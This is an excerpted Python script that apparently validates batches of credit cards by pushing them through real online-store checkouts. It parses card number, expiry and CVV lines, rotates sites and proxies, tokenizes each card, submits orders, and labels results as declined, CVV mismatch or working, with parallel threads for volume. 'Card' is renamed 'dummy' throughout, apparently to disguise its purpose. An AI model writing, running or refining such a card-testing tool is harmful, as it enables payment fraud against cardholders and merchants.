...
def step2_tokenize_dummy(session, checkout_token):
    print("[2/5] Tokenizing credit dummy...")
    ...
    payload = {
        "credit_dummy": {
            ...
            "verification_value": dummy_DATA["verification_value"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
    ...
    for ep_url, origin, referer in endpoints:
        ...
        if r.status_code == 200:
            ...
            dummy_session_id = token_data.get("id")
            if dummy_session_id:
                print(f"  [OK] dummy session ID: {dummy_session_id} via {urlparse(ep_url).netloc}")
...
def step3_proposal(session, checkout_token, session_token, dummy_session_id):
...
def step4_submit_completion(session, checkout_token, session_token, queue_token, 
                           shipping_handle, merchandise_stable_id, dummy_session_id, 
...
def parse_cc_line(line: str):
    ...
    PATTERNS = [
        ...
        re.compile(r"(?:dummy|cc|ccnum|cc num|dummy num|dummy number|dummynumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        
        re.compile(r"(?:dummy|cc|ccnum|cc num|dummy num|dummy number|dummynumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[0] + r")\s*" + SEPARATORS + r"?\s*(" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        
        re.compile(r"(?:dummy|cc|ccnum|cc num|dummy num|dummy number|dummynumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")(" + YEAR_PATTERNS[1] + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        ...
        if match:
            try:
                ...
                if len(groups[0]) in [3, 4] and len(groups) == 4:
                    if len(groups[1]) >= 13:
                        cvv, dummy, month, year = groups
                    else:
                        dummy, month, year, cvv = groups
                else:
                    dummy, month, year, cvv = groups
                
                dummy = re.sub(r'[\s\-]', '', dummy)
                
                if not re.fullmatch(r"\d{13,19}", dummy):
                    continue
    ...
    try:
        ...
        return None
    cvv = parts[3]
    name = " ".join(parts[4:]).strip() if len(parts) > 4 else "Test dummy"
    return {
        "number": number,
        "month": month,
        "year": year,
        "verification_value": cvv,
        "name": name or "Test dummy"
    }
...
def is_terminal_failure_code_display(s: str) -> bool:
    try:
        ...
        tokens = [
            ...
            "GENERIC_ERROR",
            "INCORRECT_NUMBER",
            "PAYMENTS_CREDIT_dummy_NUMBER_INVALID_FORMAT",
            "FUNDING_ERROR",
            "PROCESSING_ERROR",
            "PAYMENTS_CREDIT_dummy_BASE_EXPIRED",
...
def print_cc_summary(dummy: dict, code_display: str, amount_display: str):
    try:
        ...
        try:
            print(f"{dummy}|{code_display}|{amount_display}")
        except Exception:
            pass

SUMMARY_ONLY = True

def emit_summary_line(dummy: dict, code_display: str, amount_display: str, elapsed_seconds: float = None, site_display: str = None):
    try:
        def _status_prefix(s: str) -> str:
            ...
            if any(tok in u for tok in cvv_tokens):
                return "❌ CVV mismatch"
            fail_tokens = [
                "dummy_DECLINED", "DECLINED", "RISKY", "GENERIC_ERROR",
                "INCORRECT_NUMBER", "PAYMENTS_CREDIT_dummy_NUMBER_INVALID_FORMAT", "FUNDING_ERROR", "PROCESSING_ERROR",
                "PAYMENTS_CREDIT_dummy_BASE_EXPIRED"
            ]
        ...
        try:
            ...
            pan_fb = str(dummy.get("number", "") or "")
            try:
                mm_fb = int(dummy.get("month", 0) or 0)
            except Exception:
                mm_fb = 0
            try:
                yy_fb = int(dummy.get("year", 0) or 0)
            except Exception:
                yy_fb = 0
            cvv_fb = str(dummy.get("verification_value", "") or "")
...
def main():
    global SHOP_URL, VARIANT_ID, dummy_DATA
    ...
    if SUMMARY_ONLY:
        ...
        print("=" * 70)
        print(f"Total sites: {len(sites)} | Total CCs: {len(dummys)}")
    ...
    for idx, dummy in enumerate(dummys, start=1):
        tried_sites = set()
        worked = False
        site_attempt = 0
        ...
        while site_attempt < len(sites) and not worked:
            ...
            VARIANT_ID = None
            dummy_DATA = {**dummy_DATA, **dummy}
            site_label = format_site_label(SHOP_URL)

            masked = mask_pan(dummy.get("number", ""))
            print("=" * 70)
            ...
            while attempts < max_attempts and not worked and not site_skipped:
                ...
                dummy_session_id = step2_tokenize_dummy(session, checkout_token)
                if not dummy_session_id:
                    try:
                        ...
                        pass
                    print("\n[ERROR] Failed to tokenize dummy")
                ...
                queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required = step3_proposal(
                    session, checkout_token, session_token, dummy_session_id
                )
                ...
                if not receipt_id:
                    ...
                    emit_summary_line(dummy_DATA, code_display, amount_display, time.time() - attempt_start_time, site_label)

                    try:
                        if isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_dummy_NUMBER_INVALID_FORMAT":
                    ...
                    try:
                        if is_unknown_code_display(code_display):
                            ts = int(time.time())
                            pan_last4 = re.sub(r"\D", "", dummy_DATA.get("number", "") or "")[-4:] or "xxxx"
                    ...
                    if isinstance(submit_code, str) and submit_code.upper() in site_level_errors:
                        ...
                        try:
                            ...
                            pass
                        try:
                            if (isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_dummy_BASE_EXPIRED") or ('"PAYMENTS_CREDIT_dummy_BASE_EXPIRED"' in str(code_display).upper()):
...
def step2_tokenize_dummy_ctx(session, checkout_token, shop_url, dummy_data):
    print("[2/5] Tokenizing credit dummy...")
...
def step3_proposal_ctx(session, checkout_token, session_token, dummy_session_id, shop_url, variant_id):
    print("[3/5] Submitting proposal...")
...
def step4_submit_completion_ctx(session, checkout_token, session_token, queue_token,
    ...
    print(f"  [DEBUG] Step 4 - dummy session ID: {dummy_session_id[:30] if dummy_session_id else 'None'}...")
...
def process_dummy(idx, dummy, sites, site_product_cache):
    try:
    ...
    while site_attempt < len(sites) and not worked:
        ...
        while attempts < max_attempts and not worked and not site_skipped:
            ...
            if not checkout_token or not session_token:
                ...
                print("[INFO] Proxy considered working (CHECKOUT_FAILED), switching to next proxy")
                continue
            dummy_session_id = step2_tokenize_dummy_ctx(session, checkout_token, shop_url, dummy_data)
            if not dummy_session_id:
                print("\n[ERROR] Failed to tokenize dummy")
                print("[INFO] Proxy considered working (TOKEN_FAILED), switching to next proxy")
                continue
    ...
    with ThreadPoolExecutor(max_workers=PARALLEL_THREADS) as executor:
        for idx, dummy in enumerate(dummys, start=1):
            try:
                ...
                pass
            futures.append(executor.submit(process_dummy, idx, dummy, sites, site_product_cache))
        for f in futures:
            try:
                _ = f.result()
            except Exception as e:
